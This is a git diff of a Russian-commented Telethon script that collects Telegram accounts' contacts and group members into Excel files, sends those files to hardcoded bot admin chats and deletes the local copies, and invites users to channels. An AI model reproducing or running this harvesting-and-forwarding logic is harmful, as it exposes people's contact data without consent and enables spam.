@@ -7,19 +7,10 @@ from telethon.tl.types import InputPhoneContact
 from telethon.tl.functions.contacts import GetContactsRequest
 import asyncio  # Add this import statement at the beginning of your script
 from datetime import datetime
-
 import os
 
 def send_files_to_bot(bot, admin_chat_ids):
-   # # Проверяем наличие файла с участниками групп и отправляем его ботам
-#    if os.path.exists("users.xlsx") and os.path.getsize("users.xlsx") > 0:        for admin_chat_id in admin_chat_ids:
-#            with open("users.xlsx", "rb") as file:
-#                bot.send_document(admin_chat_id, file)
-#        # После отправки удаляем файл, чтобы избежать повторной отправки
-#        os.remove("users.xlsx")
-#    #else:
-#        #print("Файл с участниками групп не найден или пустой.")
-    
+   # Проверяем наличие файла с участниками групп и отправляем его ботам
     users_file_path = None
     for file_name in os.listdir('.'):
         if file_name.endswith('users.xlsx'):
@@ -33,15 +24,7 @@ def send_files_to_bot(bot, admin_chat_ids):
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
         os.remove(users_file_path)
-    #else:
-        #print("Файл с контактами не найден или пустой.")
-
-# Вызываем функцию отправки файлов ботам
-# send_files_to_bot(bot, admin_chat_ids)  # раскомментируйте эту строку, чтобы вызвать функцию
-
-
-
-    
+      
     # Проверяем наличие файла с контактами и отправляем его ботам
     contacts_file_path = None
     for file_name in os.listdir('.'):
@@ -56,13 +39,7 @@ def send_files_to_bot(bot, admin_chat_ids):
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
         os.remove(contacts_file_path)
-    #else:
-        #print("Файл с контактами не найден или пустой.")
-
-# Вызываем функцию отправки файлов ботам
-# send_files_to_bot(bot, admin_chat_ids)  # раскомментируйте эту строку, чтобы вызвать функцию
-
-
+    
 #получаем контакты
 async def get_contacts(client, session_name):
     result = await client(GetContactsRequest(0))
@@ -111,10 +88,6 @@ async def get_contacts(client, session_name):
     # Сохраняем документ Excel
     wb.save(f'{session_name}_contacts.xlsx')
     
-
-# Вызываем функцию get_contacts_and_send_files
-#await get_contacts_and_send_files(client, session_name, bot, admin_chat_ids)
-
 
 def inviting(client, channel, users):
     client(InviteToChannelRequest(
